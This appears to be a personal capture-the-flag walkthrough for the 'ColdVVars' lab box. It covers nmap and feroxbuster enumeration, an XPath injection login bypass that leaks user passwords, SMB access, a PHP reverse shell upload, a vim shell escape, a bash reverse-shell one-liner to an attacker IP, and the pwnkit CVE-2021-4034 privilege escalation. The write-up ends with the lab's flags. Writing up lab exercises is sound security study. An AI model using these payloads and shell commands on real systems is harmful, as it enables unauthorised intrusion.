# Box Name
## ColdVVars

---

## Overview
---
* [[#Enumeration]] nmap,ferox],smb

* [[#Initial Foothold]] [[revshell]]

* [[#Privilege Escalation]] 

---
## Enumeration
---
- ### nmap
```

Nmap 7.91 scan initiated Sat Jul 10 13:38:29 2021 as: nmap -vvv -p 139,445,8080,8082 -sC -sV -oN nmap/initial 10.10.42.158
Nmap scan report for 10.10.42.158
Host is up, received conn-refused (0.13s latency).
Scanned at 2021-07-10 13:38:31 CDT for 16s

PORT     STATE SERVICE     REASON  VERSION
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host: INCOGNITO

Host script results:
|_clock-skew: mean: -6m08s, deviation: 0s, median: -6m08s
| nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   INCOGNITO<00>        Flags: <unique><active>
|   INCOGNITO<03>        Flags: <unique><active>
|   INCOGNITO<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30164/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44107/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21848/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42745/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-07-10T18:32:35+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-10T18:32:36
|_  start_date: N/A

```

- ## ferox
```
ferox -u http://10.10.132.102:8082 -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -t 60 -x html,txt,php -C 403 -W 848 -o logs/ferox_port8080.md 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.132.102:8082
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💢  Word Count Filter     │ 848
 💾  Output File           │ logs/ferox_port8080.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301       10l       16w      179c http://10.10.132.102:8082/static
200       28l       87w     1605c http://10.10.132.102:8082/LOGIN
200      125l      730w    11162c http://10.10.132.102:8082/
301       10l       16w      179c http://10.10.132.102:8082/STATIC
301       10l       16w      179c http://10.10.132.102:8082/Static
200       28l       87w     1605c http://10.10.132.102:8082/login
200       28l       87w     1605c http://10.10.132.102:8082/Login
200       28l       87w     1605c http://10.10.132.102:8082/LogIn


```

- ## looking at the room's tag's suggests x-path injection
	- ![[Pasted image 20220309103245.png]]

- ## from https://book.hacktricks.xyz/pentesting-web/xpath-injection
	- ### we find  Authentication Bypass
	- ![[Pasted image 20220309103542.png]]


- ## using " or 1=1 or "
	- we get a XML page listing users and passwords
	```
	Username Password  
	Tove Jani  
	Godzilla KONGistheKING  
	SuperMan snyderCut  
	ArthurMorgan DeadEye
	
	```

- ## smb
	- using smbmap 
```

smbmap -H 10.10.132.102 -u ArthurMorgan -p DeadEye
[+] IP: 10.10.132.102:445	Name: 10.10.132.102                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	SECURED                                           	READ, WRITE	Dev
	IPC$                                              	NO ACCESS	IPC Service (incognito server (Samba, Ubuntu))

```
- ### logging in with smbclient we  find note .txt in /dev/SECURED
	- cat smb_note.txt                                           
	Secure File Upload and Testing Functionality
- ### this means we have file upload
	- upload a php revshell


## Initial Foothold
---

- ## curl http://10.10.132.102:8080/dev/shell.php

# on the box as www-data
---
## Privilege Escalation
----
- ## su to ArthurMorgiin with reused creds
- ## linpeas shows an interesting ENV variable 
```bash
╔══════════╣ Environment
╚ Any private information inside environment variables?
APACHE_LOG_DIR=/var/log/apache2
LANG=en_US.UTF-8
OLDPWD=/
INVOCATION_ID=dd608a6a774f4bbf985b12396a51aa73
APACHE_LOCK_DIR=/var/lock/apache2
XDG_SESSION_ID=c1
USER=ArthurMorgan
PWD=/tmp
HOME=/home/ArthurMorgan
JOURNAL_STREAM=9:20383
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
HISTFILE=/dev/null
APACHE_RUN_USER=www-data
OPEN_PORT=4545
MAIL=/var/mail/ArthurMorgan
TERM=xterm
SHELL=/bin/sh
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=3
LOGNAME=ArthurMorgan
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
HISTSIZE=0
HISTFILESIZE=0
_=/usr/bin/env


```
- ### OPEN PORT=4545
- #### start nc listener on port 4545
- ### receive a connection back from some sort of binary with a list of 4 option
```
ArthurMorgan@incognito:/tmp$ nc -lnvp 4545
Listening on [0.0.0.0] (family 0, port 4545)
Connection from 127.0.0.1 53262 received!


ideaBox
1.Write
2.Delete
3.Steal others' Trash
4.Show'nExit

```
- - ### chosing opt 4 dumps you into a vim editor
	- using the vimshell exploit from [[gtfobins]]
```
:!/bin/sh
[No write since last change]
id
uid=1002(marston) gid=1003(marston) groups=1003(marston)

```
- ## get a partial shell as marstin
	- ### use bash one liner to get a full shell interactive shell as marston
		- #### bash -c 'bash -i >& /dev/tcp/10.14.9.223/1235 0>&1'
		 ```bash
		 
nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.14.9.223] from (UNKNOWN) [10.10.154.230] 34842
bash: cannot set terminal process group (1459): Inappropriate ioctl for device
bash: no job control in this shell
marston@incognito:~$ 
		 ```
- ###  type tmux attach 
	- drops you into a tmux session then it's just a matter of finding which tmux terminal marston was running as root in
![[Pasted image 20220309125242.png]]
	- Ctrl+b then n untill you find the terminal running as root
# find suid binaries running as root
- ## find / -perm -4000 2>/dev/null
```
www-data@incognito:/home$ find / -perm -4000 2>/dev/null
/bin/su
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1 ****
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec ****
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/chfn
/sbin/mount.cifs


```

- ## vulnerable to CVE-2021-4034
	- ### pwnkit
- ## wget pwnkit.c
	- ### compile pwnkit.c  get root prompt
- cat user.txt
```
at /home/ArthurMorgan/user.txt
ae39f419ce0a3a26f15db5aaa7e446ff

```
- cat root.txt
```
cat /root/root.txt
42f191b937ea71cd2052a06a7a08585a

```